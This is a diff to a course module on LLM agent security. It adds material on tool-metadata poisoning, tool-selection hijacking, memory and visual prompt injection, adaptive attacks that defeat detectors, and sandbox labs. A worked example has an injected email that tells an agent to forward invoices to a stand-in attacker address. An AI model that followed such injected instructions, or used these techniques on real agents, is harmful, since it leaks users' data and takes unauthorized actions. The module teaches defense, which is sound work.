@@ -20,7 +20,7 @@ Module 12 introduced authority policy for tool calls and the budget reservation 
 - **Engineering Problem**: Keep an LLM system's data and authority safe when some of its inputs are written by adversaries and the model itself cannot be trusted to tell instructions from data.
 - **What You Will Do**: Build a source–sink threat model, execute direct/indirect injection and retrieval poisoning in a sandbox, evaluate detectors under adaptive attack, implement per-action authorization, an egress policy proxy, and a per-principal budget ledger, trace AgentDojo, and diagnose an exfiltration incident.
 - **Environment**: Python 3.10+, an isolated agent sandbox with mock email/files/banking tools, a small vector store, AgentDojo or equivalent harness, a network egress proxy with a sandbox-only resolver and listener, and no production credentials.
-- **Evidence Rule**: Keep source observations (**O**), explicit derivations (**D**), and telemetry-dependent hypotheses (**H**) separate. Every rate in a worked example is synthetic unless it carries an experiment-card reference (EC-1 to EC-5). All attack work runs only in authorized sandboxes, with canary values instead of real secrets and reserved names (`.example`, `.test`) instead of real endpoints.
+- **Evidence Rule**: Keep source observations (**O**), explicit derivations (**D**), and telemetry-dependent hypotheses (**H**) separate. Every rate in a worked example is synthetic unless it carries an experiment-card reference (EC-1 to EC-14). All attack work runs only in authorized sandboxes, with canary values instead of real secrets and reserved names (`.example`, `.test`) instead of real endpoints.
 
 ## 01 Baseline Assumptions
 
@@ -53,12 +53,12 @@ depth_contract:
   research_connection: REQUIRED
 
 estimated_effort:
-  instruction: 5.5h      # sum of lesson instruction estimates: 40+60+55+50+65+60 min
+  instruction: 6h        # sum of lesson instruction estimates: 40+70+60+65+65+60 min
   guided_practice: 2.5h  # sum of in-lesson practice: 20+25+25+20+35+25 min
-  labs: 12h              # LAB A 2.5h + LAB B 3h + LAB C 3h + LAB D 3.5h
+  labs: 12.5h            # LAB A 2.5h + LAB B 3h + LAB C 3h + LAB D 4h
   assessment: 3h         # Mastery transfer problem 2.5h + Incident 18.1 0.5h
   source_trace: 2h       # Lesson 18.6 pinned trace, LAB C trace step, and the Section 09 artifact are one activity, counted once here
-  total: 25h
+  total: 26h
 ```
 Each category is counted once. The source trace is not also counted as Lesson 18.6 practice, LAB C time, or assessment time.
 
@@ -140,9 +140,16 @@ How do attacker-authored instructions and facts reach the model, and why doesn't
   - $R$ — *retrieved*: at least one poisoned passage is in the context actually sent to the model. This is read from the context log, not inferred from the answer.
   - $T$ — *target match*: the answer contains the attacker's target answer. This is observable from the output alone.
   - $A$ — *causal adoption*: the answer matches the target *because of* a poisoned passage in context. It is not directly observable. It is estimated from controls and provenance (below).
+- **Agent-specific injection channels (2025–2026 primary papers; all author-reported, none reproduced here; cards EC-6 to EC-14 in Section 05)**. The same mechanism—attacker text reaches the context—arrives through sources that the older threat models treated as trusted configuration or as the agent's own past:
+  - *Tool-description (metadata) poisoning*: instructions placed in a tool's description are loaded into context when a tool server registers, before any user task. In MCPTox the poisoned tool is never called; the instruction steers the agent to misuse a *legitimate* tool, and the authors report a mean ASR of 36.5% across 20 agent settings with refusals under 3%, using non-adaptive, template-generated cases (**O**, CLM-023). A second benchmark reports near-100% ASR for some models in a sandbox with side-effect checks (**O**, CLM-024).
+  - *Tool-selection hijacking*: a crafted tool document added to a tool library is retrieved and selected for a target task without the attacker seeing the library, retriever, or model (**O**, CLM-025).
+  - *Memory poisoning*: records written into an agent's long-term memory are later retrieved as demonstrations or context. One attack writes them through ordinary queries to a memory bank shared across users (**O**, CLM-026); another writes them through a web page the agent merely viewed, then activates in a later task on a different site (**O**, CLM-027).
+  - *Visual injection*: instructions rendered on screen reach computer-use agents through screenshots, so text-level filters on HTML never see them (**O**, CLM-028).
 
 **Mechanism Explanation:**
 Indirect injection works because the model conditions on all context tokens; an instruction inside a retrieved page is just more text. Poisoning works because retrieval ranks by similarity, and an attacker can craft text similar to the target query that also carries the desired claim or instruction. Jailbreak transfer shows that alignment is a learned tendency, not an enforced boundary. None of these requires breaking cryptography or code—only write access to some source.
+
+The agent channels change *when* and *with what standing* the attacker's text arrives. Tool metadata enters before the user speaks and is read as part of the agent's configuration. Memory records are read as the agent's own prior experience, and they persist across tasks, so the attack and its effect can be separated in time and site. A tool-selection attack does not ask the model to do anything unusual; it makes the attacker's tool the plausible choice. In every case the model sees text it cannot authenticate, and the defense question is where authority is decided—Lesson 18.4 analyses each channel.
 
 A target match has more than one possible cause. The model may already hold the target answer as prior knowledge. A response cache may replay an answer produced by an earlier poisoned run. Another document, such as a stale legitimate page, may state the same thing. Each is an *alternate path* from some source to the answer. Finding $T$ without $R$ is therefore a finding to investigate, not a row to delete.
 
@@ -195,6 +202,7 @@ The attributable effect of poisoning is estimated by $P(T)-P_0(T)$ on matched tr
 1. Why is indirect injection possible even when the user is benign?
 2. A report says "retrieval rate 0.60, adoption rate 0.50, so attack success is 0.30". Which denominator is wrong?
 3. An answer matches the target and the context log shows no poisoned passage. Name three paths to check.
+4. MCPTox divides successful attacks by *valid* outputs; VPI-Bench divides by *all* attack samples. Why can the two rates not be compared directly?
 
 **Guided Practice:**
 In the sandbox, place one indirect injection in a tool result that asks for a `send_email` call to a sandbox address. Record whether the model attempts the call, and whether the gateway (Lesson 18.4) would authorize it. Then recompute the worked example with the cache disabled: the two cache trials become $\neg T$.
@@ -204,6 +212,7 @@ In the sandbox, place one indirect injection in a tool result that asks for a `s
   - Knowledge Check 1: the application, not the user, places third-party text in context.
   - Knowledge Check 2: 0.50 is $P(T)$ over all trials. The conditional rate is $96/120=0.80$, and the retrieved-path contribution is 0.48.
   - Knowledge Check 3: model prior (no-retrieval control), response cache, another document in the corpus.
+  - Knowledge Check 4: excluding invalid outputs raises the rate for models that often produce malformed output; the denominators describe different populations, and the attack sets, agents, and judges also differ.
   - Guided Practice: the table becomes $R$: 96/24, $\neg R$: 2/78. $P(T)=98/200=0.49$, $P(T\mid\neg R)=2/80=0.025$, and $0.48+0.40\times0.025=0.49$.
   - For the injection: location, attempted action, and gateway decision, over a stated number of paraphrases and seeds.
 - *Common Failure*: Reporting "the model resisted" from one trial; dividing target matches by all trials and calling it the follow rate; deleting target matches that lack retrieval.
@@ -211,9 +220,9 @@ In the sandbox, place one indirect injection in a tool result that asks for a `s
 - *Concept to Revisit*: Stage attribution (Module 10, Lesson 10.5); stochastic evidence (Module 16, Lesson 16.5).
 
 **Learning Outcome:**
-Execute and explain injection and poisoning mechanisms, and report retrieval, target match, and estimated causal adoption with their own denominators and controls.
+Execute and explain injection and poisoning mechanisms, including tool-metadata, tool-selection, memory, and visual channels, and report retrieval, target match, and estimated causal adoption with their own denominators and controls.
 
-*(Effort: 60m instruction, 25m practice)*
+*(Effort: 70m instruction, 25m practice)*
 
 ---
 
@@ -228,6 +237,10 @@ What do prompt-level defenses and detectors actually buy, and how must they be e
 - **Static attack**: a fixed set of attack inputs written without access to the deployed defense, each tried once.
 - **Adaptive attack**: a search that optimizes against the deployed defense with a stated budget and stated feedback. Nasr et al. evaluate 12 defenses and report attack success above 90% for most of them, where most had originally reported near-zero success (**O**, CLM-007; author-reported, experiment card EC-3). In their AgentDojo experiments the search attack had up to 800 queries per scenario on an 80-sample subset. Spotlighting's success rate there was 0–28% under the benchmark's static attack and 47–99% under search, depending on the model. With *no added defense* the same four models were at 75–100% under the same search, so the comparison that matters is defended-adaptive against undefended-adaptive, not against the static number.
 - **ASR@budget**: attack success reported together with attempts per case, what the attacker observes, and what the attacker knows. Without these three, two ASR values cannot be compared.
+- **More adaptive evidence (2025–2026)**:
+  - Zhan et al. re-tested eight indirect-injection defenses (two detectors, perplexity filtering, three prompt-level defenses, paraphrasing, adversarial fine-tuning) on a 100-case InjecAgent subset with white-box adaptive strings trained for up to 500 steps, and report ASR above 50% against every one (**O**, CLM-029; EC-10). Their adaptive attacker knows and can differentiate through the defense, which is a stronger assumption than a remote attacker usually has.
+  - LLMail-Inject ran a public challenge in which participants knew the deployed defenses and could submit freely. Of 370,724 phase-1 submissions, 3,018 (0.8%) were end-to-end successes; the funnel shows the deeper stages are where most attempts failed (**O**, CLM-030; EC-11). A low per-submission rate is not a low risk: one success is enough, and the organisers report that some defenses needed a few hundred attempts before the first success.
+  - Narisetty et al. re-ran one out-of-band defense (Progent) on an AgentDojo subsample with a hand-crafted, defense-aware template and report mean ASR 25.8% undefended, 4.2% defended, 2.6% under their adaptive template, at a utility cost from about 45% to about 26% (**O**, CLM-031; EC-12). The authors themselves call it one small data point that does not establish robustness against an optimized attack.
 
 **Mechanism Explanation:**
 Defenses that rely on the model or a classifier recognizing malice are probabilistic. They lower opportunistic success, add latency and false positives, and can be optimized against. Evaluate them with the attacker moving second: fixed attack strings are a smoke test, not evidence of robustness. An empirical evaluation cannot prove a defense robust. It can only report that a search of a stated strength failed to break it.
@@ -269,7 +282,7 @@ Evaluate a detector on a static injection set, then run a budgeted adaptive sear
 **Learning Outcome:**
 Evaluate probabilistic defenses under adaptive attack with a stated budget and baseline, and report their costs.
 
-*(Effort: 55m instruction, 25m practice)*
+*(Effort: 60m instruction, 25m practice)*
 
 ---
 
@@ -292,6 +305,25 @@ What the guarantee covers must be read from the design, not from the headline. C
 **Quantitative Model / Trade-off Comparison:**
 Report each configuration as (benign utility, utility under attack, ASR), with the attack protocol stated. For CaMeL, $84.5\%\to77.3\%$ on 97 user tasks is 82 → 75 tasks, a cost of 7 tasks for that model on that benchmark (**D** from the reported percentages). The same design costs another model in the same table 32 points, including a fall from 60% to 0% on the travel suite. Your cost depends on how often tasks need untrusted data to choose the next action, and on how well the planning model handles undocumented tool outputs. Hypothesis to test (**H**, CLM-015): cutting one leg of source–sensitive data–sink removes more adaptive exfiltration than adding another detector at matched utility cost.
 
+**Attack-to-Defense Analysis for Agent Channels** (attack and paper-defense columns **O** from cards EC-3 and EC-6 to EC-14; control column **D**, CLM-032; any claim that a control holds under adaptive attack is **H**, CLM-033):
+
+Each row asks the source–sink questions of Lesson 18.1: which untrusted source, which sink, whose authority, and which assumption the attack breaks. The "Paper-evaluated defense" column reports only what the cited authors measured, inside their scope. The derived controls are this module's derivation. None of them has been evaluated here.
+
+| Attack class (card) | Source → sink, authority | Assumption broken | Paper-evaluated defense (**O**) | Derived control (**D**) | Residual risk | Sandbox test and adaptive budget |
+|---|---|---|---|---|---|---|
+| Tool-description poisoning (EC-6, EC-7) | Tool metadata loaded at registration → a *legitimate* high-privilege tool, run with the agent's credential | Tool descriptions are trusted configuration | A guardrail filter changed ASR from 0.997 to 0.844 for one model and from 0.980 to 0.998 for another (EC-7). MCPTox only proposes defenses | Pin each reviewed tool manifest by content hash and refuse a changed manifest until re-reviewed. Authorize every call by task capability and per-argument provenance, never by description text. Treat values introduced by a description as tainted | A reviewed description that is malicious but plausible. Parameter changes that stay inside the granted scope | Sandbox tool server with canary data. Cases: call redirection, implicit trigger, parameter tampering, description changed after pinning. Pass: zero dispatched calls outside capability, every hash change refused. Adaptive: 50 description rewrites per case, gateway decisions visible to the attacker |
+| Tool-selection hijacking (EC-8) | Third-party tool document in a retrievable library → the attacker's tool is selected and executed | Retrieval plus model choice selects the right tool | The authors evaluated StruQ, SecAlign, and four detectors and report them insufficient. Perplexity detection missed 90% of gradient-optimized documents at under 1% false positives | Restrict selection to an allowlist of reviewed tools per task capability. Record the publisher for each tool document. An unreviewed tool receives no credential | An attacker tool already inside the reviewed set. Displacement of the correct tool (denial of service) | Insert shadow-optimized tool documents into a sandbox library. Measure selection rate and dispatched calls to unreviewed tools. Adaptive: a stated number of optimization iterations against a shadow pipeline |
+| Memory injection by queries (EC-9) | Attacker's own queries → records written to a memory bank shared across users → the victim's later reasoning | Stored records are trusted past experience; shared memory is benign | Prompt-level detection was either precise for one agent and missed the others, or general with false positives up to 34/50. The authors argue that per-user isolation and rate limits can be evaded by identity disguise or coordination; they did not test this | Partition memory by authenticated principal. Record write provenance (principal, source, whether derived from untrusted content). A record from another principal or with untrusted provenance cannot supply arguments for a privileged action | Poisoning within one principal's own memory. Weak authentication, which defeats any partition | Two sandbox principals. The attacker principal submits a query sequence; measure victim-query ASR with and without partition. Adaptive: number of attacker queries and identities, stated |
+| Environment-injected memory poisoning (EC-13) | A web page observed in task A → stored trajectory → action in task B on another site | Per-task, per-site permissions bound what a later task can do | None evaluated. The authors state that the attack bypasses site-scoped permission defenses in principle | Propagate observation provenance into memory and through retrieval. The gateway treats arguments derived from tainted memory (for example a URL) as untrusted. The egress proxy of Lesson 18.5 decides the destination | Tainted memory that personalization needs. Benign-looking actions on an allowed site | Task-A/task-B sandbox sites with a canary URL. Measure navigation to the canary with and without taint and proxy. Adaptive: payload variants under injected failures (dropped clicks, garbled text) |
+| Visual prompt injection (EC-14) | Rendered screen content → file, terminal, or browser actions of a computer-use agent | Text-level input filters see every instruction | A defensive system prompt had no consistent effect: it lowered rates in some platform–model pairs and raised them in others | Grant filesystem and terminal capability per task only. Apply the authority gateway to OS-level actions and the egress proxy to uploads | Actions inside the granted capability. Confirmation fatigue | Sandbox page with a rendered instruction to delete or upload a canary file. Measure attempted against dispatched. Adaptive: rendering and placement variants |
+| Adaptive injection against detectors and prompt defenses (EC-10, EC-11, EC-3) | Any untrusted source → any sink | A detector's static rate holds under optimization | Eight defenses above 50% ASR under white-box adaptive strings (EC-10). 0.8% of challenge submissions were end-to-end successes, enough for a breach (EC-11) | Do not let a detector decide authority. Keep detectors as depth and put the decision in out-of-band checks | In-scope actions; text-to-text harms that no action check sees | LAB C protocol: same cases for every configuration, undefended adaptive baseline, stated budget and feedback |
+| Adaptive attack against an out-of-band policy (EC-12) | Any untrusted source → policy-mediated tool calls | A policy model or monitor cannot itself be steered | One defense held against one hand-crafted adaptive template on a 7B model (25.8% → 4.2% → 2.6% ASR), with utility about 45% → 26% | Policy authoring and provenance assignment are trusted components and must not read untrusted text | An optimized attack on the policy model; a wrong provenance label | Attack the policy layer directly with a stated optimization budget. Report utility beside ASR |
+
+How to read the table:
+- **The derived controls share one assumption** (CLM-032): authority is decided by components that read only authenticated principal, task capability, reviewed manifests, and recorded provenance. They never read the untrusted text itself. If provenance is mislabelled, if a reviewed tool is itself malicious, or if the requested task genuinely needs untrusted data to choose the action, the control does not cover the case.
+- **Stating that a row's control works under adaptive attack would be a hypothesis, not a result** (**H**, CLM-033). The prediction is that, at matched benign utility, these deterministic checks keep the unauthorized-dispatch rate under adaptive attack below the rate for a detector-only configuration. The measurement is the sandbox test in each row. The falsifier is any adaptive run in which a call outside capability is dispatched, or in which the detector-only configuration reaches an equal or lower rate at equal utility.
+- **Numbers in the table are from different papers, agents, denominators, and attack strengths.** They show that each channel exists and what was tried against it. They do not rank the channels.
+
 **Worked Example** (a design walk-through; no measurement):
 - *Input.* User request: "Summarize my latest invoice email." The email body contains a sentence asking the assistant to forward all invoices to `billing@attacker.example`. The task capability grants `read_email` on the user's inbox and nothing else.
 - *Steps.* The model proposes `send_email(to="billing@attacker.example", …)`. The gateway evaluates, in order:
@@ -312,6 +344,7 @@ Report each configuration as (benign utility, utility under attack, ASR), with t
 **Knowledge Check:**
 1. Map Hardy's compiler/billing-file story onto an email agent.
 2. Why is "ask the model whether this action is safe" not an authorization check?
+3. A tool server's description is pinned by hash and passes review. Name one attack in the table that still succeeds, and the control that limits its damage.
 
 **Guided Practice:**
 Write the gateway policy for a banking agent: capabilities per task type, taint rules per argument, confirmation thresholds, and audit fields.
@@ -320,15 +353,16 @@ Write the gateway policy for a banking agent: capabilities per task type, taint 
 - *Expected Output*:
   - Knowledge Check 1: the agent is the compiler (the deputy), its credential is the ambient privilege, and the injected recipient is the caller-supplied file name.
   - Knowledge Check 2: the model is the component under attack, so its answer is attacker-influenced. An authorization check must use inputs the attacker cannot write.
+  - Knowledge Check 3: parameter tampering that stays within the granted scope, or a reviewed description that is malicious but plausible. Per-argument provenance and narrow capability scope limit the damage; pinning only proves the text has not changed since review.
   - Guided Practice: a policy table with one row per tool. Each row gives the capability scope per task type, the arguments that must originate from the user query (recipient account, amount), the confirmation threshold, the ledger limits, and the audit fields: principal, capability, argument provenance, decision, and context hash.
 - *Common Failure*: Relying on a system prompt instruction "never send money to strangers", or tainting whole messages instead of individual arguments.
 - *Diagnostic Hint*: Which component would still block the action if the model were fully compromised? For each argument, can attacker-written text choose its value?
 - *Concept to Revisit*: Authority and effect verification (Module 12, Lesson 12.5); idempotent effects (Module 14, Lesson 14.2).
 
 **Learning Outcome:**
-Design authorization that holds when the model is manipulated, and state what it does not cover.
+Design authorization that holds when the model is manipulated, map each agent-specific attack channel to the control that would decide its authority, and state what each control does not cover.
 
-*(Effort: 50m instruction, 20m practice)*
+*(Effort: 65m instruction, 20m practice)*
 
 ---
 
@@ -570,9 +604,16 @@ Papers quoted with a number were opened in full text (arXiv HTML) on 2026-10-01.
 
 **WORKLOAD-DEPENDENT:** [Spotlighting](https://arxiv.org/abs/2403.14720) (Hines et al.; arXiv v1, 2024; EC-2), classifiers as defense in depth, confirmation thresholds, taint granularity, and the utility cost of control/data separation.
 
-**FRONTIER** (as of opened sources; no 2026 primary paper on agent-security defenses was opened, `TODO_VERIFY`)
+**FRONTIER** (as of the sources opened through the 2026-09-30 cutoff; a targeted search, not a survey)
 - [CaMeL](https://arxiv.org/abs/2503.18813) — Debenedetti et al.; arXiv v2, 2025; EC-4. *Scope*: control/data separation with its threat model and utility cost.
 - [The Attacker Moves Second](https://arxiv.org/abs/2510.09023) — Nasr et al.; arXiv v1, 2025; EC-3. *Scope*: evidence across 12 defenses for adaptive evaluation. It is an author recommendation, not an adopted standard.
+- *Agent attack channels, 2025–2026* (all full text; EC-6 to EC-14):
+  - Tool metadata: [MCPTox](https://arxiv.org/abs/2508.14925) (Wang et al.; v2, 2026); [When the Manual Lies](https://arxiv.org/abs/2605.24069) (Liu et al.; v1, 2026).
+  - Tool selection: [Prompt Injection Attack to Tool Selection in LLM Agents](https://arxiv.org/abs/2504.19793) (Shi et al.; v3, 2025).
+  - Memory: [Memory Injection Attacks on LLM Agents via Query-Only Interaction](https://arxiv.org/abs/2503.03704) (Dong et al.; v5, 2026); [Poison Once, Exploit Forever](https://arxiv.org/abs/2604.02623) (Zou et al.; v2, 2026).
+  - Visual: [VPI-Bench](https://arxiv.org/abs/2506.02456) (Cao et al.; v2, ICLR 2026).
+  - Adaptive evaluation: [Adaptive Attacks Break Defenses Against Indirect Prompt Injection Attacks on LLM Agents](https://arxiv.org/abs/2503.00061) (Zhan et al.; v2, NAACL 2025 Findings); [LLMail-Inject](https://arxiv.org/abs/2506.09956) (Abdelnabi et al.; v1, 2025); [Adaptive Evaluation of Out-of-Band Defenses](https://arxiv.org/abs/2606.26479) (Narisetty et al.; v1, 2026).
+  - *Scope*: these establish that the channels exist and what their authors measured on their own fixtures. Many more 2025–2026 papers on these channels were listed by the search and not opened; they are not cited.
 
 **LEGACY / INSUFFICIENT** (course position): system-prompt instructions as security controls; alignment as a boundary; static ASR as robustness; ambient credentials; directly rendered remote images; query stripping as the egress control; an iteration cap as a cost ceiling.
 
@@ -617,6 +658,78 @@ Papers quoted with a number were opened in full text (arXiv HTML) on 2026-10-01.
 - *Attacker knowledge/budget*: static templates. “Important message” knows user/model names; “Max” takes best of four templates per case.
 - *Metrics/baseline/result*: benign utility, utility under attack, targeted ASR, with 95% confidence intervals. GPT-4o Table 5 triples are quoted in Lesson 18.6. Tool filtering fails where required tools also suffice for attack (17% of cases).
 - *Status/limits*: author-reported, not reproduced. Data card calls default-attacks-only evaluation unsuitable for robustness claims.
+
+The cards below were read on 2026-10-01 in arXiv HTML full text. All are author-reported and not reproduced. Model names are the papers' experimental subjects.
+
+*EC-6 — MCPTox* (CLM-023)
+- *Version*: arXiv:2508.14925v2, 29 Sep 2026; §§3–5, Table 2.
+- *Threat model*: the attacker registers a tool server whose tool descriptions carry instructions. The poisoned tool is never executed; the instruction makes the agent misuse a legitimate tool on the same server. Three paradigms: explicit-trigger function hijacking, implicit-trigger function hijacking, implicit-trigger parameter tampering.
+- *Tasks/denominator*: 45 live servers, 353 real tools, 1,348 cases generated from templates by few-shot prompting and checked by hand; 20 agent settings. ASR = successful attacks ÷ *valid* outputs (invalid outputs excluded).
+- *Attacker knowledge/budget*: knows the server's legitimate tools; no optimization against any defense. The authors list adaptive generation as future work.
+- *Result*: mean ASR 36.5% across settings; highest 72.8% (o1-mini); highest refusal ratio below 3%. Parameter tampering was the most effective paradigm (mean 46.7%).
+- *Defenses*: proposed only (metadata sanitization, intent-alignment check before calls, reasoning audit); none evaluated.
+
+*EC-7 — When the Manual Lies (MCP-TDP)* (CLM-024)
+- *Version*: arXiv:2605.24069v1, 22 May 2026; §§II–V, Table IV.
+- *Threat model*: the attacker publishes a tool to a registry or compromises a repository and edits only the description field: a new lure tool, or a mutated existing tool.
+- *Tasks/denominator*: 32 test cases in 6 risk categories, Docker sandbox, one client; 8 models; each case run 5 times. Success requires a forensic side effect (file, log, egress) checked by script and by hand. ASR = successes ÷ N cases, averaged over runs.
+- *Attacker knowledge/budget*: hand-written descriptions; not adaptive.
+- *Result*: the five most capable models executed the payload in over 89% of cases; GPT-4o close to 100%.
+- *Evaluated defense*: a guardrail filter: ASR 0.997 → 0.844 (GPT-4o) and 0.980 → 0.998 (Gemini 2.5 Pro-pre). Observed self-correction after execution is qualitative.
+- *Limits*: small case count; single client.
+
+*EC-8 — ToolHijacker* (CLM-025)
+- *Version*: arXiv:2504.19793v3, 24 Aug 2025; §§II-B, IV, V; Tables I–II.
+- *Threat model*: no-box. The attacker can add one tool document to a library but cannot read the library, learn $k$, access or query the retriever or the model, or see the users' task wording. They build a shadow pipeline.
+- *Tasks/denominator*: MetaTool (199 benign tools) and ToolBench (9,650); 10 target tasks × 100 task descriptions per dataset. ASR = selections of the malicious tool ÷ task descriptions. Attack hit rate is measured separately for retrieval.
+- *Models*: 8 target LLMs and 4 retrievers.
+- *Result*: e.g., 96.7% ASR on MetaTool with GPT-4o as target and a different shadow model; 100% attack hit rate on MetaTool.
+- *Evaluated defenses*: StruQ, SecAlign, known-answer detection, DataSentinel, perplexity and windowed perplexity. Authors report all insufficient; e.g., 99.6% ASR under StruQ, and perplexity detection missing 90% of gradient-optimized documents at under 1% false positives.
+
+*EC-9 — MINJA* (CLM-026)
+- *Version*: arXiv:2503.03704v5, 12 Feb 2026; §§3, 5, 5.4; Tables 1, 5.
+- *Threat model*: the attacker is a regular user of an agent whose memory bank is shared across users. They cannot edit memory or other users' queries; they submit queries that make the agent store records which later redirect a victim's query.
+- *Agents/tasks*: EHRAgent (MIMIC-III, eICU), RAP (Webshop), a QA agent (MMLU); GPT-4 and GPT-4o. Nine victim–target pairs per configuration; 10–15 attack queries per pair mixed with 30–50 benign queries.
+- *Metrics*: injection success rate = injected records ÷ attack queries; ASR = victim test queries (10 or 30 per pair) whose response contains the target reasoning; utility drop on benign queries.
+- *Result*: mean injection success 98.2%; mean ASR 76.8%.
+- *Evaluated defense*: prompt-level detection. A targeted prompt flagged 131/135 on one agent and 0/135 on another; a general prompt flagged 29–123 of 90–135 with up to 34/50 false positives. Isolation and rate limits were argued to be evadable, not tested.
+
+*EC-10 — Adaptive attacks on IPI defenses* (CLM-029)
+- *Version*: arXiv:2503.00061v2, 4 Mar 2025 (NAACL 2025 Findings); §§3–6, Appendix A.
+- *Threat model*: white-box. The attacker knows and can differentiate through the agent and the defense.
+- *Tasks/denominator*: 100-case InjecAgent subset (50 direct-harm, 50 data-stealing). ASR-all = successes ÷ all cases; invalid outputs count as failures.
+- *Agents*: Vicuna-7B prompted agent; Llama3-8B fine-tuned agent.
+- *Budget*: GCG-family or AutoDAN strings of about 20 tokens; up to 500 training steps; about 30 GPU-minutes per string.
+- *Result*: every one of eight defenses exceeded 50% ASR under its adaptive attack. Undefended baselines: 56% (Vicuna) and 9% (Llama3).
+- *Limits*: two small open models; single turn evaluated.
+
+*EC-11 — LLMail-Inject* (CLM-030)
+- *Version*: arXiv:2506.09956v1, 11 Jun 2025; §§2–4, 7.
+- *Setting*: a simulated email assistant. Participants submit one email each; success needs retrieval, evasion of every defense at once, and a `send_email` call with exact arguments. Defenses: spotlighting, Prompt Shield, LLM judge, TaskTracker, with thresholds at under 5% false positives. Models: Phi-3-medium and GPT-4o-mini.
+- *Attacker knowledge/budget*: participants knew the defenses; submissions were not limited.
+- *Result*: phase 1, 3,018 of 370,724 submissions (0.8%) end-to-end successful; phase 2, 306 of 90,916 (0.3%). Some defenses needed a few hundred attempts before the first success.
+- *Limits*: a fixed task per level; per-submission rates count attempts, not distinct attackers.
+
+*EC-12 — Adaptive evaluation of out-of-band defenses* (CLM-031)
+- *Version*: arXiv:2606.26479v1, 25 Jun 2026; §§10–11.
+- *Setting*: reproduction of Progent on AgentDojo with Qwen2.5-7B on one GPU; banking, slack, workspace; the first 8 user tasks per suite × all injection tasks; three runs at temperature 0.
+- *Attacks*: AgentDojo's `important_instructions`, and one hand-crafted, defense-aware template.
+- *Result*: mean ASR 25.8% undefended, 4.2% with Progent, 2.6% under the adaptive template. Mean utility under attack about 45% → about 26%.
+- *Limits stated*: one weak model, one black-box template, policy model substituted; an optimized white-box attack remains open. The result is consistent with, but does not establish, the hypothesis that out-of-band enforcement is harder to attack.
+
+*EC-13 — eTAMP* (CLM-027)
+- *Version*: arXiv:2604.02623v2, 7 Apr 2026; §§2–3, Appendix A.
+- *Threat model*: the attacker controls user-generated web content only. No access to memory, model, or system prompt; memories are retrieved by semantic similarity and retrieval is not guaranteed. The injection is seen in task A and activates in task B on a different site.
+- *Tasks/denominator*: about 280 cross-site task pairs on (Visual)WebArena. ASR_B = task-B executions that navigate to the attacker URL at any step. Task-A trajectories are controlled pseudo trajectories containing the payload.
+- *Result*: up to 32.5% (GPT-5-mini), 23.4% (GPT-5.2), 19.5% (GPT-OSS-120B). Injected environment failures raised one model's rate from 3.6% to 32.5%.
+- *Defenses*: none evaluated (stated limitation).
+
+*EC-14 — VPI-Bench* (CLM-028)
+- *Version*: arXiv:2506.02456v2, 1 Mar 2026 (ICLR 2026); §§3–4.
+- *Threat model*: black-box. The attacker controls content on a legitimate platform (a shop page, an email, a message), rendered visually. No knowledge of the user, task, or agent.
+- *Tasks/denominator*: 306 cases across five replicated platforms in a sandbox with file system and simulated services. AR = attempted ÷ N and SR = successful ÷ N, judged by majority vote of three LLM judges, averaged over three runs.
+- *Result*: the abstract reports agents deceived at rates up to 51% (computer-use) and 100% (browser-use) on certain platforms; the text reports computer-use success below 60% on every platform. The per-platform table was not transcribed here.
+- *Evaluated defense*: a defensive system prompt had no consistent effect, lowering rates in some platform–model pairs and raising them in others.
 
 **PRODUCTION SOURCE TRACE**
 - Repository/revision: `ethz-spylab/agentdojo` at `089ed468cf3ed0322acc66b0211f26d9d90dbf60`.
@@ -668,9 +781,10 @@ All labs follow `PREDICT → BUILD → MEASURE → EXPLAIN → BREAK → IMPROVE
 - **Independent Variables**: Gateway rules, detector, egress configuration, ledger key, sandbox network policy.
 - **Dependent Variables**: ASR by path, utility, confirmation, audit completeness, unauthorized listener/resolver requests, maximum cost per principal.
 - **Measurements**: E1–E7/C0/C1 resolver and listener logs; ledger tests for multi-tool iteration, nested retry, context growth, budget rejection, and restart across episodes.
-- **Break & Falsify**: Any unauthorized lookup/request in E1–E5 falsifies proxy. Any $C+R>B$, dispatch after rejection, or ledger key changed by document/tool content falsifies ledger.
+- **Extension — agent channels** (0.5h): run two rows of the Lesson 18.4 attack-to-defense table against the gateway in the sandbox. (1) A mock tool server whose description asks for a different legitimate tool or a changed argument, and a second load with the description altered after pinning. (2) A memory store shared by two sandbox principals, where the attacker principal writes records through ordinary queries. Report dispatched calls outside capability, refused manifest changes, and victim-query outcomes with and without per-principal partition, under a stated number of description rewrites or attacker queries. Use canary data and mock servers only.
+- **Break & Falsify**: Any unauthorized lookup/request in E1–E5 falsifies proxy. Any $C+R>B$, dispatch after rejection, or ledger key changed by document/tool content falsifies ledger. Any call outside capability dispatched in the extension falsifies the derived control for that channel (CLM-033).
 - **Alignment**: Lessons 18.4–18.5 and Incident 18.1.
-- **Effort Estimate**: 2.5h build, 1h analysis (3.5h total).
+- **Effort Estimate**: 2.5h build, 1h analysis, 0.5h agent-channel extension (4h total).
 
 ---
 
@@ -708,9 +822,9 @@ A procurement agent reads supplier emails/PDFs, searches an employee-editable po
 
 **Required Deliverables**:
 1. Source–sink model with credentials, paths, and non-tool sinks.
-2. Sandbox attack plan covering indirect injection, poisoning, and output-channel exfiltration; event definitions, denominators, no-poison and no-retrieval controls.
+2. Sandbox attack plan covering indirect injection, poisoning, output-channel exfiltration, and the agent channels that apply (supplier tool metadata, tool selection, memory); event definitions, denominators, no-poison and no-retrieval controls.
 3. Detector evaluation under same-case static/adaptive protocols, no-defense baseline, and composed benign FPR.
-4. Authority design: capability/taint/confirmation policy; ledger key and caps; $C_{max}$; four ledger tests plus cross-episode restart.
+4. Authority design: capability/taint/confirmation policy; tool-manifest pinning and memory write provenance where those channels exist; ledger key and caps; $C_{max}$; four ledger tests plus cross-episode restart.
 5. Rendering/browsing/document egress policy; E1–E7/C0/C1 results; residual risk at allowed destinations.
 6. Evaluation report with metric vector, pairwise dominance, predeclared objective, ship/hold decision, and cost.
 7. Pinned AgentDojo source trace.
@@ -752,6 +866,7 @@ Reference answers: (2) injection-task check; `True` means attack goal executed. 
 | Injection/poisoning events | 18.2 model/table | 18.2 Checks 2–3; LAB B | D2; Incident steps 3–5; Attack rubric | $R\times T$ table, two controls, $T\wedge\neg R$ provenance |
 | Adaptive defense evaluation | 18.3 example; EC-2/3 | 18.3 Practice; LAB C | D3; Defense rubric | Same-case static/adaptive table, no-defense baseline, FPR |
 | Authority/control-data separation | 18.4 decision table; EC-4 | 18.4 Practice; LAB D | D4; Incident step 6; Authority rubric | Gateway policy and audit decisions |
